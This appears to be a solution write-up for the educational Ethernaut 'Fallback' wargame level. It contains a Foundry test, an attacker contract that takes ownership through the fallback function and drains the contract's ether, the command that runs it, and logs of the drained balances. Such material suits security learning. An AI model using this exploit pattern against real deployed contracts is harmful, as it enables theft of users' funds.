# What is OpenZeppelin Ethernaut?

`OpenZeppelin Ethernaut` is an educational platform that provides interactive and gamified challenges to help users learn about Ethereum smart contract security. It is developed by OpenZeppelin, a company known for its security audits, tools, and best practices in the blockchain and Ethereum ecosystem.

OpenZeppelin Ethernaut Website: ethernaut.openzeppelin.com

# What You're Supposed to Do?

in `01-Fallback` Challenge, You Should Try To find a Way to Do the Following:

1. You Claim ownership of the Contract From Someone else.
2. Find a Way to Steal All Funds From the Contract.

`01-Fallback` Challenge Link: ethernaut.openzeppelin.com/level/0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB


# How to Complete this Challenge?

Take a Look at `testAttackerCanTakeOwnershipAndStealAllFunds` test at `TestFallback.t.sol`:

```javascript

    modifier multipleContributes {
        address[] memory users = new address[](10);
        for (uint i = 0; i < 10; i++) {
            users[i] = address(uint160(i + 1));

            vm.startPrank(users[i]);
            vm.deal(users[i],10 ether);
            fback.contribute{value: 0.0001 ether}();
            vm.stopPrank();
        }
        _;
    }


    function testAttackerCanTakeOwnershipAndStealAllFunds() external multipleContributes {
            vm.startPrank(attacker);
            vm.deal(attacker, 0.1 ether);
            AttackerContract attackerContract = new AttackerContract(fback, attacker);

            uint256 attackerContractBalanceBeforetheAttack = address(attackerContract).balance;
            uint256 fallbackContractBalanceBeforetheAttack = address(fback).balance;

            attackerContract.attack{value: 0.1 ether}();

            uint256 attackerContractBalanceAftertheAttack = address(attackerContract).balance;
            uint256 fallbackContractBalanceAftertheAttack = address(fback).balance;

            console2.log("Attacker Contract Balance Before the Attack: ", attackerContractBalanceBeforetheAttack);
            console2.log("Fallback Contract Balance Before the Attack: ", fallbackContractBalanceBeforetheAttack);

            console2.log("Attacker Contract Balance After the Attack: ", attackerContractBalanceAftertheAttack);
            console2.log("Fallback Contract Balance After the Attack: ", fallbackContractBalanceAftertheAttack);

            assertEq(attackerContractBalanceBeforetheAttack, fallbackContractBalanceAftertheAttack);
            assertEq(attackerContractBalanceAftertheAttack, fallbackContractBalanceBeforetheAttack + 0.1 ether);

            vm.stopPrank();
        }

```

And this is the Contract the Attacker Used to Steal All the Funds of the Fallback Contract:

```javascript
    contract AttackerContract {

        Fallback fallbackContract;
        address private immutable attacker;

        modifier onlyOwner {
            if (msg.sender != attacker) {
                revert("You're Not Owner!");
            }
            _;
        }

        constructor(Fallback _fallbackContract, address _attacker) {
            fallbackContract = _fallbackContract;
            attacker = _attacker;
        }

        function attack() external payable {
            fallbackContract.contribute{value: 0.0001 ether}();
            (bool success,) = address(fallbackContract).call{value: 0.000001 ether}("");
            require(success,"Low Level Call Failed!");
            fallbackContract.withdraw();
        }

        function withdrawContractBalance() external {
            uint256 thisContractBalance = address(this).balance;
            payable(attacker).transfer(thisContractBalance);
        }

        receive() external payable {

        }

        fallback() external payable {

        }

    }
```

You Can Perform the Attack by Running Following Command in Your Terminal: (it is Required to Have Foundry installed.)

```javascript
     forge test --match-test testAttackerCanTakeOwnershipAndStealAllFunds -vvvv
```

then Take Look at Logs:

```javascript
    Logs:
        Attacker Contract Balance Before the Attack:  0
        Fallback Contract Balance Before the Attack:  1000000000000000
        Attacker Contract Balance After the Attack:  101000000000000000
        Fallback Contract Balance After the Attack:  0
```